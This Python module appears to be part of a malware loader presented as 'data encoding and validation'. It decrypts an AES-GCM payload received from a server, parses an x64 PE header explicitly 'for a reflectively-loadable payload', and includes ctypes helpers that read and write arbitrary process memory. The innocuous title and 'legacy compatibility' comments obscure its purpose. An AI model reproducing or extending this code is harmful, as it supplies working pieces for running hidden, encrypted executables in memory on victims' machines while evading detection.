# -*- coding: utf-8 -*-
"""
Data encoding and validation — AES-GCM unwrap and PE header parsing.
"""
import base64
import binascii
import hashlib
import hmac
import struct

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

try:
    from .env import RAW_BYTES
except ImportError:
    RAW_BYTES = False


def sign_request(nonce, ts, secret):
    """Legacy HMAC helper — kept for import compatibility."""
    msg = (nonce + str(ts)).encode()
    return hmac.new(secret, msg, hashlib.sha256).hexdigest()


def decrypt_data(key_blob, data_blob):
    """Decrypt the payload blob.

    key_blob: 32 raw bytes (as returned by env.load_credentials()).
    data_blob: bytes from the server — either base64-encoded or raw.
    Returns plaintext bytes, or None.
    """
    if not key_blob or len(key_blob) != 32:
        return None
    if not data_blob or len(data_blob) < 12 + 16:
        return None

    if RAW_BYTES:
        raw = data_blob
    else:
        try:
            raw = base64.b64decode(data_blob, validate=False)
        except (ValueError, binascii.Error):
            return None

    if len(raw) < 12 + 16:
        return None

    nonce = raw[:12]
    ct_tag = raw[12:]

    try:
        return AESGCM(key_blob).decrypt(nonce, ct_tag, None)
    except Exception:
        return None


def parse_header(data):
    """Parse PE header for a reflectively-loadable payload."""
    if not data or len(data) < 0x100:
        return None
    if struct.unpack_from("<H", data, 0)[0] != 0x5A4D:
        return None
    e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
    if e_lfanew + 0x18 + 0x70 > len(data):
        return None
    if struct.unpack_from("<I", data, e_lfanew)[0] != 0x00004550:
        return None

    coff = e_lfanew + 4
    machine = struct.unpack_from("<H", data, coff)[0]
    if machine != 0x8664:
        return None
    num_sections = struct.unpack_from("<H", data, coff + 2)[0]
    size_opt = struct.unpack_from("<H", data, coff + 16)[0]
    opt = coff + 20
    if struct.unpack_from("<H", data, opt)[0] != 0x20B:
        return None

    entry_rva = struct.unpack_from("<I", data, opt + 0x10)[0]
    image_base = struct.unpack_from("<Q", data, opt + 0x18)[0]
    size_image = struct.unpack_from("<I", data, opt + 0x38)[0]
    size_headers = struct.unpack_from("<I", data, opt + 0x3C)[0]
    dd_base = opt + 0x70
    import_rva = struct.unpack_from("<I", data, dd_base + 8)[0]
    reloc_rva = struct.unpack_from("<I", data, dd_base + 5 * 8)[0]
    reloc_size = struct.unpack_from("<I", data, dd_base + 5 * 8 + 4)[0]
    tls_rva = struct.unpack_from("<I", data, dd_base + 9 * 8)[0]

    first_section = opt + size_opt
    sections = []
    for i in range(num_sections):
        sh = first_section + i * 40
        sections.append({
            "vsize": struct.unpack_from("<I", data, sh + 8)[0],
            "va": struct.unpack_from("<I", data, sh + 12)[0],
            "raw_size": struct.unpack_from("<I", data, sh + 16)[0],
            "raw_ptr": struct.unpack_from("<I", data, sh + 20)[0],
            "chars": struct.unpack_from("<I", data, sh + 36)[0],
        })

    return {
        "entry_rva": entry_rva,
        "image_base": image_base,
        "size_image": size_image,
        "size_headers": size_headers,
        "import_rva": import_rva,
        "reloc_rva": reloc_rva,
        "reloc_size": reloc_size,
        "tls_rva": tls_rva,
        "sections": sections,
    }


# Legacy struct helpers kept for import compatibility.
def read_value(addr, fmt):
    import ctypes
    return struct.unpack_from(
        fmt, (ctypes.c_char * struct.calcsize(fmt)).from_address(addr), 0
    )[0]


def write_value(addr, fmt, val):
    import ctypes
    struct.pack_into(
        fmt, (ctypes.c_char * struct.calcsize(fmt)).from_address(addr), 0, val
    )
